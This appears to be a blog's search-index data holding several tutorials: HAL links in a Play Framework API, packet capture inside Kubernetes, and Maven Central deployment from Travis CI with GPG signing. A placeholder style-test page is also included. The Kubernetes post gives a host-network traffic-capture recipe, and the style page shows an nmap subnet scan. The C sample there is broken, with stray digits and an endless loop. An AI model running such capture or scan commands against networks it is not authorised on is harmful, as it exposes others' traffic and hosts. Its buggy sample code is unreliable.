<code>pet</code>, we still want to know what pet is associated with the order but we don't want the entire pet taking up half of our response object.</li> <li>the <code>photoUrl</code> on our pet is just a string, without human input or schema a client can't know that there is anything queryable or cachable about that field</li> </ul>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#add-hal","title":"Add HAL","text":"<p>Up until now we've rushed through creation of a simple service, since all of that is rather pedestrian. Here is where we will add something slightly more interesting by using HAL to make our API fully RESTfull with HATEOAS.</p> <p>Let's start in the models with our <code>Pet</code>. We will implement <code>black.door.hate.HalResource</code> which means implementing two methods, <code>location()</code> and <code>representationBuilder()</code>.</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#location-method","title":"<code>location()</code> method","text":"<p><code>location()</code> is a pretty straightforward method, it returns a <code>URI</code> indicating where this particular pet can be accessed. We could simply hard-code this like <code>\"/pets/\" + id</code>, but if we do that then any time we change the API we would need to modify <code>Pet.location()</code>, the routes file, and any other place we were writing the location of a pet. Instead we can use play framework's reverse router to build the location of our pet from the routes file. This way our location always reflects what the API is actually listenting for. Using the reverse router our location method would look like this</p> <pre><code>public URI location() {\n    return URI.create(controllers.routes.ResourceController.showPet(id).url());\n}\n</code></pre>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#representationbuilder-method","title":"<code>representationBuilder()</code> method","text":"<p>The <code>representationBuilder()</code> method defines exactly what we want our model to look like. We can add properties, links, and other embedded resources. The <code>name</code>, <code>type</code>, and <code>status</code> fields are clearly properties of the pet. However as we mentioned earlier, we don't want <code>photoUrl</code> as a property, so instead let's add it as a link. Likewise, rather than putting <code>id</code> as a field, we can add the location of the whole object as a link (named <code>self</code> by the HAL spec).</p> <p>So now <code>Pet</code> looks like this</p> <pre><code>public class Pet implements HalResource{\n\n    ... // everything we saw earlier\n\n    public HalRepresentation.HalRepresentationBuilder representationBuilder() {\n        HalRepresentation.HalRepresentationBuilder builder = HalRepresentation.builder()\n                .addProperty(\"name\", name)\n                .addProperty(\"type\", type)\n                .addProperty(\"status\", status)\n                .addLink(\"self\", this);\n        if(photoUrl != null)\n            builder = builder.addLink(\"photo\", URI.create(photoUrl));\n        return builder;\n    }\n\n\n    public URI location() {\n        return URI.create(controllers.routes.ResourceController.showPet(id).url());\n    }\n}\n</code></pre> <p>Giving <code>Item</code> the same treatment defining each property might feel a little tedious (after all, it looked fine serialized earlier), fortunately we don't have to. Instead we can implement <code>JacksonHalResource</code> instead of <code>HalResource</code>. Now we don't need to implement the <code>representationBuilder()</code> method, just <code>location()</code>. The library will take care of adding all the properties and <code>self</code> link for us.</p> <pre><code>public class Item implements JacksonHalResource{\n\n    ...\n\n    public URI location() {\n        return URI.create(controllers.routes.ResourceController.showItem(id).url());\n    }\n}\n</code></pre> <p>On to our favorite model, <code>Order</code>. We can apply the same steps as our other models, but we also don't want to serialize that whole <code>pet</code> field. Instead we can add <code>pet</code> as a link, just the same as we did with <code>pet.photoUrl</code>. </p> <pre><code>public class Order implements HalResource{\n\n    ...\n\n    public HalRepresentation.HalRepresentationBuilder representationBuilder() {\n        return HalRepresentation.builder()\n                .addProperty(\"quantity\", quantity)\n                .addProperty(\"orderDate\", orderDate)\n                .addLink(\"self\", this)\n                .addLink(\"pet\", pet)\n                .addEmbedded(\"item\", item);\n    }\n\n    public URI location() {\n        return URI.create(controllers.routes.ResourceController.showOrder(id).url());\n    }\n}\n</code></pre>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#asembedded","title":"<code>asEmbedded()</code>","text":"<p>One last quick thing we need to do is tell our controller to use the HAL format when we return our entities. Just add <code>.asEmbedded()</code> to each model before we give it to jackson.</p> <pre><code>return ok(Json.toJson(order.asEmbedded()));\n</code></pre>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#pretty","title":"Pretty","text":"<p>Now when we call <code>GET /store/orders/1</code> we get this:</p> <pre><code>{\n  \"quantity\": 2,\n  \"orderDate\": \"2016-08-22T00:14:08.442+0000\",\n  \"_links\": {\n    \"self\": {\n      \"href\": \"/store/orders/1\"\n    },\n    \"pet\": {\n      \"href\": \"/pets/1\"\n    }\n  },\n  \"_embedded\": {\n    \"item\": {\n      \"name\": \"chew toy\",\n      \"_links\": {\n        \"self\": {\n          \"href\": \"/store/inventory/1\"\n        }\n      }\n    }\n  }\n}\n</code></pre> <p><code>pet</code> is no longer embedded, but we still know where to find it, <code>item</code> is clearly a related resource to the order and we know where to go if we want to modify it. If we go to <code>_links.pet.href</code> (If you're using postman that link should be clickable. click it. It's quite satisfying) we get </p> <pre><code>{\n  \"name\": \"fido\",\n  \"type\": \"dog\",\n  \"status\": \"available\",\n  \"_links\": {\n    \"photo\": {\n      \"href\": \"https://upload.wikimedia.org/wikipedia/commons/a/a6/Dog_anatomy_lateral_skeleton_view.jpg\"\n    },\n    \"self\": {\n      \"href\": \"/pets/1\"\n    }\n  }\n}\n</code></pre> <p>and <code>photo</code> is clearly a link now.</p>"},{"location":"2016/08/21/hypermedia-apis-in-play-framework-with-the-blackdoor-hate-library/#changing-the-api","title":"Changing the API","text":"<p>Just for fun, let's say we wanted to change the mapping in our routes file from <code>GET /store/inventory/:itemId controllers.ResourceController.showItem(itemId: Long)</code> to <code>GET /store/items/:itemId     controllers.ResourceController.showItem(itemId: Long)</code></p> <p>We could do that, and when we call <code>GET /store/orders/1</code> again, we get</p> <pre><code>{\n\n  ...\n\n  \"_embedded\": {\n    \"item\": {\n      \"name\": \"chew toy\",\n      \"_links\": {\n        \"self\": {\n          \"href\": \"/store/items/1\"\n        }\n      }\n    }\n  }\n}\n</code></pre> <p>note that item's <code>self</code> link has changed to <code>/store/items/1</code>.</p> <p>Thanks for reading!</p> <p>Get the source code for this post here Check out more of hate, the blackdoor HATEOAS library with HAL.</p>"},{"location":"2020/09/30/kubernetes-packet-capture-for-dummies/","title":"Kubernetes Packet Capture for Dummies","text":"<p>Have you ever needed to analyze the traffic on your kube cluster? It's easier to do than you might think, and you might be surprised how much traffic you can get from inside a container. There are three steps; first get a shell inside a container on your cluster, then use tcpdump to capture network traffic, finally exfil the traffic to your local machine and inspect it with wireshark.</p>"},{"location":"2020/09/30/kubernetes-packet-capture-for-dummies/#get-a-shell-on-your-cluster","title":"Get a shell on your cluster","text":"<pre><code>kubectl run \\\n-it \\\n--rm \\\ndebug \\\n--restart=Never \\\n--image=ubuntu \\\n--overrides='{\"kind\":\"Pod\", \"apiVersion\":\"v1\", \"spec\": { \\\n  \"hostNetwork\":true, \\\n  \"nodeName\": \"node1\" \\\n}}'\n</code></pre> <p>let's break that down a bit</p> <ul> <li><code>-it</code> - get an interactive terminal once the pod starts</li> <li><code>--rm</code> - delete the pod once the process completes</li> <li><code>--image=ubuntu</code> - use the ubuntu base image</li> <li>setting <code>hostNetwork</code> to <code>true</code> ensures we use have access to the instance's network if</li> <li>setting <code>nodeName</code> is optional, but if you want you can use it to determine which node your pod will run on</li> </ul>"},{"location":"2020/09/30/kubernetes-packet-capture-for-dummies/#capture-network-traffic","title":"Capture network traffic","text":"<pre><code>apt-get update &amp;&amp; apt-get install -y net-tools tcpdump\ntcpdump -w dump.pcap\n</code></pre> <p>Install tcpdump and run it to dump network traffic to a file. If needed, additional parameters can be used to filter what should be captured. A handy one is <code>'tcp port 80'</code>.</p>"},{"location":"2020/09/30/kubernetes-packet-capture-for-dummies/#analyze","title":"Analyze","text":"<p>Download your traffic dump using </p> <pre><code>kubectl cp myNamespace/debug:/dump.pcap dump.pcap\n</code></pre> <p>where debug is the name of the pod we started for our shell.</p> <p>Then just open <code>dump.pcap</code> with wireshark and explore!</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/","title":"Complete guide to continuous deployment to maven central from Travis CI.","text":"<p>Continuous deployment is a very useful tool for open source projects. The people accepting pull requests in an open source project may not all have the permissions or skills to also deploy those changes, but continuous deployment offers them a way around that. Once code is accepted into the master branch, that code is deployed automatically. This allows individuals deploying pull requests to add agile features and make bug fixes without taking up too much time.</p> <p>This guide will take your maven library project from creation and local installation to creation and code-signing in the cloud, where it is then deployed to maven central. We make a few assumptions about your starting point:</p> <ul> <li>Your project already is a valid maven project (if it's not, see here)</li> <li>Your project is hosted on github (if not, create a repo)</li> <li>You are using Linux, OSX or other *nix system with bash</li> <li>You have gpg installed and available on the path</li> <li>You have the travis command line client installed (<code>gem install travis</code>)</li> </ul>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#obtain-ossrh-account","title":"Obtain OSSRH account","text":"<p>OSSRH is a free host for open source projects in maven central. If you do not already have an account, follow the instructions for initial setup and ensure you get a confirmation email. You should use a domain you own for the group id, such as <code>com.mysite</code>. If you do not have a domain, it is also popular to use your github domain, such as <code>io.github.username</code>.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#configure-maven-project-for-upload-to-ossrh","title":"Configure maven project for upload to OSSRH","text":"<p>Before we can start to consider uploading, we need to ensure our project has all the information it needs to be a quality library. We need to fill out the following fields in our pom.xml:</p> <ul> <li><code>name</code> - the name of the project</li> <li><code>description</code> - a short description</li> <li><code>url</code> - location where users can go to get more information about the library</li> <li><code>licences</code> - self explanatory</li> <li><code>scm</code> - source control information</li> <li><code>developers</code> - who worked on the project</li> </ul> <p>Once complete, these might look like this:</p> <pre><code>&lt;name&gt;my library&lt;/name&gt;\n&lt;description&gt;A library.&lt;/description&gt;\n&lt;url&gt;https://username.github.io/project&lt;/url&gt;\n&lt;licenses&gt;\n    &lt;license&gt;\n        &lt;name&gt;MIT License&lt;/name&gt;\n        &lt;url&gt;http://www.opensource.org/licenses/mit-license.php&lt;/url&gt;\n        &lt;distribution&gt;repo&lt;/distribution&gt;\n    &lt;/license&gt;\n&lt;/licenses&gt;\n\n&lt;scm&gt;\n    &lt;url&gt;https://github.com/username/project&lt;/url&gt;\n    &lt;connection&gt;scm:git:git://github.com/username/project.git&lt;/connection&gt;\n    &lt;developerConnection&gt;scm:git:git@github.com:username/project.git&lt;/developerConnection&gt;\n&lt;/scm&gt;\n\n&lt;developers&gt;\n    &lt;developer&gt;\n        &lt;id&gt;username&lt;/id&gt;\n        &lt;name&gt;John Doe&lt;/name&gt;\n        &lt;email&gt;jdoe@email.com&lt;/email&gt;\n    &lt;/developer&gt;\n&lt;/developers&gt;\n</code></pre> <p>In order to deploy to central, we need maven to do four things (called plugins in maven) above and beyond its usual role: </p> <ul> <li>sign</li> <li>package docs</li> <li>package source</li> <li>staging</li> </ul> <p>First lets add a couple bits needed by ossrh. The first part will tell the staging plugin where to deploy. The second part tells how to deploy and <code>autoReleaseAfterClose</code> instructs the plugin to finalize our deployment after upload.</p> <pre><code>&lt;distributionManagement&gt;\n    &lt;snapshotRepository&gt;\n        &lt;id&gt;ossrh&lt;/id&gt;\n        &lt;url&gt;https://oss.sonatype.org/content/repositories/snapshots&lt;/url&gt;\n    &lt;/snapshotRepository&gt;\n&lt;/distributionManagement&gt;\n&lt;build&gt;\n    ...\n        &lt;plugin&gt;\n            &lt;groupId&gt;org.sonatype.plugins&lt;/groupId&gt;\n            &lt;artifactId&gt;nexus-staging-maven-plugin&lt;/artifactId&gt;\n            &lt;version&gt;1.6.6&lt;/version&gt;\n            &lt;extensions&gt;true&lt;/extensions&gt;\n            &lt;configuration&gt;\n                &lt;serverId&gt;ossrh&lt;/serverId&gt;\n                &lt;nexusUrl&gt;https://oss.sonatype.org/&lt;/nexusUrl&gt;\n                &lt;autoReleaseAfterClose&gt;true&lt;/autoReleaseAfterClose&gt;\n            &lt;/configuration&gt;\n        &lt;/plugin&gt;\n    &lt;/plugins&gt;\n    ...\n&lt;/build&gt;\n</code></pre> <p>We don't want this to happen every time we build the project on maven, so we will create profiles. This enables us to choose what plugins to use. Create a profile for code signing by adding the following to your <code>pom.xml</code></p> <pre><code>&lt;profiles&gt;\n    ...\n    &lt;profile&gt;\n        &lt;id&gt;sign&lt;/id&gt;\n        &lt;build&gt;\n            &lt;plugins&gt;\n                &lt;plugin&gt;\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                    &lt;artifactId&gt;maven-gpg-plugin&lt;/artifactId&gt;\n                    &lt;version&gt;1.6&lt;/version&gt;\n                    &lt;executions&gt;\n                        &lt;execution&gt;\n                            &lt;id&gt;sign-artifacts&lt;/id&gt;\n                            &lt;phase&gt;verify&lt;/phase&gt;\n                            &lt;goals&gt;\n                                &lt;goal&gt;sign&lt;/goal&gt;\n                            &lt;/goals&gt;\n                        &lt;/execution&gt;\n                    &lt;/executions&gt;\n                &lt;/plugin&gt;\n            &lt;/plugins&gt;\n        &lt;/build&gt;\n    &lt;/profile&gt;\n    ...\n&lt;/profiles&gt;\n</code></pre> <p>Create a profile for packaging sources and docs by adding the following to your <code>pom.xml</code></p> <pre><code>&lt;profiles&gt;\n    ...\n    &lt;profile&gt;\n        &lt;id&gt;build-extras&lt;/id&gt;\n        &lt;activation&gt;\n            &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;\n        &lt;/activation&gt;\n        &lt;build&gt;\n            &lt;plugins&gt;\n                &lt;plugin&gt;\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                    &lt;artifactId&gt;maven-source-plugin&lt;/artifactId&gt;\n                    &lt;version&gt;2.4&lt;/version&gt;\n                    &lt;executions&gt;\n                        &lt;execution&gt;\n                            &lt;id&gt;attach-sources&lt;/id&gt;\n                            &lt;goals&gt;\n                                &lt;goal&gt;jar-no-fork&lt;/goal&gt;\n                            &lt;/goals&gt;\n                        &lt;/execution&gt;\n                    &lt;/executions&gt;\n                &lt;/plugin&gt;\n                    &lt;plugin&gt;\n                    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;\n                    &lt;artifactId&gt;maven-javadoc-plugin&lt;/artifactId&gt;\n                    &lt;version&gt;2.10.3&lt;/version&gt;\n                    &lt;executions&gt;\n                        &lt;execution&gt;\n                            &lt;id&gt;attach-javadocs&lt;/id&gt;\n                            &lt;goals&gt;\n                                &lt;goal&gt;jar&lt;/goal&gt;\n                            &lt;/goals&gt;\n                        &lt;/execution&gt;\n                    &lt;/executions&gt;\n                &lt;/plugin&gt;\n            &lt;/plugins&gt;\n        &lt;/build&gt;\n    &lt;/profile&gt;\n    ...\n&lt;/profiles&gt;\n</code></pre> <p>Next we need to provide some information to those plugins so they can run. The primary piece of information needed is our ossrh credentials as well as what certificate should be used to sign our code. To do this, we will use a separate settings file. Create a new folder for our deployment files <code>$ mkdir cd</code>. Create our settings file at <code>cd/mvnsettings.xml</code>. Add the following to the file:</p> <pre><code>&lt;settings&gt;\n  &lt;servers&gt;\n    &lt;server&gt;\n      &lt;id&gt;ossrh&lt;/id&gt;\n      &lt;username&gt;${env.OSSRH_JIRA_USERNAME}&lt;/username&gt;\n      &lt;password&gt;${env.OSSRH_JIRA_PASSWORD}&lt;/password&gt;\n    &lt;/server&gt;\n  &lt;/servers&gt;\n\n  &lt;profiles&gt;\n    &lt;profile&gt;\n      &lt;id&gt;ossrh&lt;/id&gt;\n      &lt;activation&gt;\n        &lt;activeByDefault&gt;true&lt;/activeByDefault&gt;\n      &lt;/activation&gt;\n      &lt;properties&gt;\n        &lt;gpg.executable&gt;gpg&lt;/gpg.executable&gt;\n        &lt;gpg.keyname&gt;${env.GPG_KEY_NAME}&lt;/gpg.keyname&gt;\n        &lt;gpg.passphrase&gt;${env.GPG_PASSPHRASE}&lt;/gpg.passphrase&gt;\n      &lt;/properties&gt;\n\n    &lt;/profile&gt;\n  &lt;/profiles&gt;\n&lt;/settings&gt;\n</code></pre> <p>Maven supports environment variables in its settings files, so the <code>${env.VAR}</code> fields tell maven to fill the field with the value in the environment variable <code>VAR</code>. We will define these variables later in travis as encrypted environment variables.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#create-code-signing-cert","title":"Create code signing cert","text":""},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#create-master-key","title":"Create master key","text":"<p>Now we need to create a certificate with which to sign our code. If you already have a gpg certificate, skip to \"Create signing sub-key\".</p> <p>Create a master key with <code>$ gpg --gen-key</code>. Select <code>RSA and RSA</code>, or <code>ECDSA</code> if it's available. Enter the maximum key size (<code>4096</code> for <code>RSA</code>). Enter <code>0</code> for no key expiration. Enter your information. Choose a strong passphrase (see diceware if you're not sure how to pick a strong passphrase).</p> <p>This master key will act as your digital identity for the rest of your life, so take good care of it. </p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#create-signing-sub-key","title":"Create signing sub-key","text":"<p>Our master key is super important to us, and we would never entrust it to \"the cloud\", so we need to create a more controllable sub-key. This sub-key will be used to sign our code. To add a sub-key, begin to edit the master key we just created with <code>$ gpg --edit-key your@email.com</code> (where <code>your@email.com</code> was the email you set for the master key) Type <code>addkey</code>. Choose one of the options marked as <code>(sign only)</code>, probably <code>RSA</code>. Enter the maximum key size (<code>4096</code> for <code>RSA</code>). Enter a reasonable expiration. Perhaps <code>20y</code>. Type <code>save</code>.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#publish-key","title":"Publish key","text":"<p>To ensure our keys are not revoked, ossrh will look to one of a set of keyservers. In order to enable that, we need to upload our (public) keys so ossrh can see them. We will upload our keys to both the MIT and Ubuntu key servers for redundancy.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#find-your-key-id","title":"Find your key id","text":"<p>Use <code>$ gpg --list-keys</code> to see all they keys in your keyring. One of the entries should look something like this</p> <pre><code>pub   4096R/$keyid 2015-05-29 [expires: whenever]\nuid       [ unknown] Your Name &lt;your@email.com&gt;\n... more stuff\n</code></pre> <p>update: in newer versions of gpg your list-keys output may look more like this <pre><code>pub   rsa4096 2015-05-29 [SC] [expires: whenever]\n      $keyid\nuid           [ unknown] Your Name &lt;your@email.com&gt;\n</code></pre></p> <p>The string in place of <code>$keyid</code> is your key id. Submit your key to the ubuntu server with <code>$ gpg --send-keys --keyserver keyserver.ubuntu.com $keyid</code> Submit your key to the MIT server with <code>$ gpg --send-keys --keyserver pgp.mit.edu $keyid</code> And once more just to be sure <code>$ gpg --send-keys --keyserver pool.sks-keyservers.net $keyid</code> </p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#remove-master-keys","title":"Remove master keys","text":""},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#backup","title":"Backup","text":"<p>Now would be a good (read: critical) time to back up your keys. Best practices for backing up keys are beyond the scope of this guide, but backing them up to a paper copy and storing that in a physically secure location is recommended. Export your public keys with <code>$ gpg --export --armor your@email.com &gt; mysupersecretkey.asc</code> Append your private keys to the same file with <code>$ gpg --export-secret-keys --armor your@email.com &gt;&gt; mysupersecretkey.asc</code> </p> <p>Now put <code>mysupersecretkey.asc</code> somewhere very safe and destroy the file (use <code>$ shred --remove mysupersecretkey.asc</code> for destruction)</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#export-sub-keys","title":"Export sub-keys","text":"<p><code>$ gpg --export-secret-subkeys your@email.com &gt; subkeys</code></p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#remove-master-keys_1","title":"Remove master keys","text":"<p><code>$ gpg --delete-secret-key your@email.com</code></p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#import-sub-keys-and-clean-up","title":"Import sub-keys and clean up","text":"<p>Import your sub-keys back with <code>$ gpg --import subkeys</code> Shred the export <code>$ shred --remove subkeys</code> Now you should have only the private encryption key and our private code signing key left. We also want to delete the encryption key, as that is what people will use to send you secret messages and there is no place for that in code signing. Edit your key again <code>$ gpg --edit-key your@email.com</code> You should see the keys available, and one of the lines will look like this <code>sub  4096R/DEADBEEF  created: 2015-04-26  expires: 2025-04-27  usage: E</code> Note specifically the <code>sub</code> at the beginning of the line, and the <code>E</code> on the end of the line. These indicate that it is an encrypting subkey.  Type <code>key n</code> where <code>n</code> is the index of the private encryption sub-key to select that key. You should now see a <code>*</code> next to the line with that key. If the <code>*</code> is next to the wrong line, just type <code>key 0</code> to clear the selection and try again. Now that you're sure the right line is selected, type <code>delkey</code> to delete that key. Type <code>save</code> to finish. Now you should see something like the following when you use <code>$ gpg --list-secret-keys</code> </p> <pre><code>sec#   4096R/$keyid 2015-05-29 [expires: sometime]\nuid                  Your Name &lt;your@email.com&gt;\nssb   4096R/DEADBEEF 2015-05-29\n</code></pre> <p>The <code>#</code> after the <code>sec</code> tells you that the secret signing master key is not in the keyring and the single <code>ssb</code> (SecretSuBkey) indicates that there is only one secret subkey.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#change-passphrase","title":"Change passphrase","text":"<p>Finally we will change the passphrase. This prevents someone from accessing your main key. If someone compromises the passphrase on CI, it will have nothing to do with the passphrase to your main key.</p> <pre><code>$ gpg --edit-key your@email.com\npasswd\nsave\n</code></pre>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#encrypt-cert-and-variables-for-travis","title":"Encrypt cert and variables for travis","text":""},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#encrypt-cert","title":"Encrypt cert","text":"<p>Login to travis if you have not yet <code>$ travis login</code> Now let's export our cert so we can encrypt it for travis.</p> <pre><code>$ gpg --export --armor your@email.com &gt; codesigning.asc\n$ gpg --export-secret-keys --armor your@email.com &gt;&gt; codesigning.asc\n</code></pre> <p>Make sure your working directory is the git root of your project. Encrypt the keys <code>$ travis encrypt-file codesigning.asc</code> Take note of the line that looks like <code>openssl aes-256-cbc -K...</code> Shred the un-encrypted keys <code>$ shred --remove codesigning.asc</code> Make sure to move the created file to <code>cd/codesigning.asc.enc</code></p> <p>We want to be able to decrypt that file once we are on Travis CI, so we will create a script to do that for us. Create a file at <code>cd/before-deploy.sh</code> with the content: </p> <pre><code>#!/usr/bin/env bash\nif [ \"$TRAVIS_BRANCH\" = 'master' ] &amp;&amp; [ \"$TRAVIS_PULL_REQUEST\" == 'false' ]; then\n    openssl aes-256-cbc -K $encrypted_SOME_key -iv $encrypted_SOME_iv -in cd/signingkey.asc.enc -out cd/signingkey.asc -d\n    gpg --fast-import cd/signingkey.asc\nfi\n</code></pre> <p>where the <code>openssl</code> line is the one you took note of earlier.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#encrypt-variables","title":"Encrypt variables","text":"<p>Encrypt environment variables using <code>$  travis encrypt MY_SECRET_ENV=super_secret</code>. We need to encrypt the variables we used earlier in the <code>mvnsettings.xml</code>. Once again, those were</p> <ul> <li><code>OSSRH_JIRA_USERNAME</code></li> <li><code>OSSRH_JIRA_PASSWORD</code></li> <li><code>GPG_KEY_NAME</code> - the email address on your cert</li> <li><code>GPG_PASSPHRASE</code> - the passphrase we set for our cert</li> </ul> <p>Use the travis CLI to encrypt those and take note of the output of each command.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#create-travisyml","title":"Create <code>.travis.yml</code>","text":"<p>Next we will need a <code>.travis.yml</code> file to tell Travis CI what to do with our project. Our file will look something like this</p> <pre><code>language: java\nenv:\n  global:\n    - secure: \"the base64 string from when you encrypted OSSRH_JIRA_USERNAME\"\n    - # ^^ OSSRH_JIRA_USERNAME\n    - secure: \"the base64 string from when you encrypted OSSRH_JIRA_PASSWORD\"\n    - # ^^ OSSRH_JIRA_PASSWORD\n    - secure: \"the base64 string from when you encrypted GPG_KEY_NAME\"\n    - # ^^ GPG_KEY_NAME\n    - secure: \"the base64 string from when you encrypted GPG_PASSPHRASE\"\n    - # ^^ GPG_PASSPHRASE\n\ninstall: mvn install -P !build-extras -DskipTests=true -Dmaven.javadoc.skip=true -B -V\nscript: mvn test -P !build-extras -B\n\ncache:\n  directories:\n    - ~/.m2/repository\n\nafter_success:\n  - ./cd/before-deploy.sh\n  - ./cd/deploy.sh\n</code></pre> <p>The <code>after_success</code> section lets us define commands we want to run if all the builds and tests pass. We use it to run the script we made which decrypts our certificate, as well as a script that will do our deployment.</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#create-deploy-script","title":"Create deploy script","text":"<p>We called a deploy script in the <code>after_success</code> section of our <code>.travis.yml</code>. We will define that file now, so create the file <code>cd/deploy.sh</code> with the content: </p> <pre><code>#!/usr/bin/env bash\nif [ \"$TRAVIS_BRANCH\" = 'master' ] &amp;&amp; [ \"$TRAVIS_PULL_REQUEST\" == 'false' ]; then\n    mvn deploy -P sign,build-extras --settings cd/mvnsettings.xml\nfi\n</code></pre> <p>This tells Travis that if we're on the <code>master</code> branch and this is not a pull request, it should deploy the project to maven while making sure to use the <code>sign</code> and <code>build-extras</code> profiles and any settings in our settings file.</p> <p>If all goes well, we should be able to check this into our master branch, see it run on Travis CI and see our code on maven central.</p> <p>If you have any questions, or tips on how to improve the guide, feel free to contact me at nfischer921@gmail.com</p>"},{"location":"2016/08/08/complete-guide-to-continuous-deployment-to-maven-central-from-travis-ci/#resources","title":"Resources","text":"<ul> <li>https://alexcabal.com/creating-the-perfect-gpg-keypair/</li> <li>https://maven.apache.org/plugins/maven-gpg-plugin/sign-mojo.html</li> <li>https://www.gnupg.org/documentation/manpage.html</li> <li>https://www.theguardian.com/info/developer-blog/2014/sep/16/shipping-from-github-to-maven-central-and-s3-using-travis-ci</li> <li>https://docs.travis-ci.com/user/environment-variables/#Encrypted-Variables</li> <li>https://docs.travis-ci.com/user/customizing-the-build/</li> <li>https://docs.travis-ci.com/user/encrypting-files/</li> </ul>"},{"location":"1970/01/01/post-style-testing/","title":"Post style testing","text":"<p>{: .alert-box-white } Lorem ipsum dolor sit amet consectetur adipiscing elit. Nunc sapien magna, molestie at commodo ut, fringilla vel velit. Ut lectus lectus, tempor sit amet convallis in, rhoncus id libero.</p> <p></p> <p>{: .photo-caption } Figure 1-1: Photo caption can be done by just typing beneath the image embed.</p>"},{"location":"1970/01/01/post-style-testing/#header1","title":"Header1","text":"<p>Some text under the Header looks like this.</p>"},{"location":"1970/01/01/post-style-testing/#header2","title":"Header2","text":"<p>Some fun text about something</p>"},{"location":"1970/01/01/post-style-testing/#header21","title":"Header2.1","text":"<p>Some more fun text, isn't this FUN?</p> <p>italics bold</p> <pre><code>int i;\nint j = 0;\nfor(i = 0; i &lt; j; ++i)\n{\n    printf(\"%d\\n\", i);010101010101010101010101010101010101010101010101010101010101\n}\n</code></pre> <p>and some <code>inline code</code> too.</p> <p>block quote? one long block quote or no?</p> <p></p> <p>-JT</p>"},{"location":"1970/01/01/post-style-testing/#just-experimenting","title":"Just experimenting","text":"<p>Check out the highlighting.</p> <pre><code>char *backenders[] = {\n    \"Nate\", \"CJ\",\n    \"Jacob\", \"Trent\"\n};\n</code></pre> <p>And now for some good 'ol term output:</p> <pre><code>~$ nmap -sV 192.168.100.0/24 &gt; scan.txt\n</code></pre> <p>And now I'll check for max length of code output:</p> <pre><code>/*\n * This program opens a .pep file containing\n * protein sequence data, then prompts the user\n * to search for a motif in the data.\n *\n * @Trent Clostio | tclostio.github.io\n */\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint strindex(char s[], char t[])\n{\n    int i, j, k;\n\n    for (i = 0; s[i] != '\\0'; i++) {\n        for (j = i, k = 0; t[k] != '\\0' &amp;&amp; s[j] == t[k]; j++, k++)\n            ;\n        if (k &gt; 0 &amp;&amp; t[k] == '\\0')\n            return i;\n    }\n    return -1;\n}\nvoid usage()\n{\n    printf(\"\\n..........::USAGE::..........\\n\\n\");\n    printf(\"./find_motif [file_to_read].pep\\n\\n\");\n}\nint main(int argc, char *argv[])\n{\n    char *filename;\n    char *buffer;\n    char motif[100];\n    long size;\n    int found = 0;\n\n    if (argc != 2) {\n        usage();\n        exit(1);\n    }\n    filename = argv[1];\n    FILE *file = fopen(filename, \"rb\");\n    if (!file) {\n        printf(\"ERROR: File not readable.\\n\");\n        exit(1);\n    }\n\n    fseek(file, 0L, SEEK_END);\n    size = ftell(file);\n    rewind(file);\n\n    buffer = calloc(1, size + 1);\n    if(!buffer) {\n        fclose(file);\n        fputs(\"MEMORY ALLOC FAILED.\\n\", stderr);\n        exit(1);\n    }\n    if (1 != fread(buffer, size, 1, file)) {\n        fclose(file);\n        free(buffer);\n        fputs(\"FILE READ FAILED.\\n\", stderr);\n        exit(1);\n    }\n\n    printf(\"Enter motif to search:\\n\");\n    scanf(\"%s\", motif);\n\n    while (strindex(buffer, motif) &gt; 0) {\n        found++;\n        printf(\"Found %d occurrences.\\n\",\n                found);\n    }\n    fclose(file);\n    free(buffer);\n    return 0;\n}\n</code></pre> <p>-TC</p>"},{"location":"2019/09/10/log-tracing-with-plain-old-scala-futures/","title":"Log tracing with plain old Scala <code>Future</code>s","text":"<p>Log tracing (also known as request tracing, distributed tracing, or just tracing) is the technique of tying multiple log events together to give a more comprehensive picture of an event in a system. This is accomplished by generating a unique ID for each event that is sent with each log and used to correlate the logs together. The issue is that logging is a cross cutting concern and it's extremely unwieldy to pass this correlation ID as a parameter to every function and method that might need to produce a log. Typically in syncronous application code this is solved with something like a <code>ThreadLocal</code> which allows the ID to be retrieved by any code running on the same thread without passing the value. Many synchronous libraries/frameworks (Mapped Diagnostic Context in SLF4J, Brave (used by Spring Cloud Sleuth), etc) 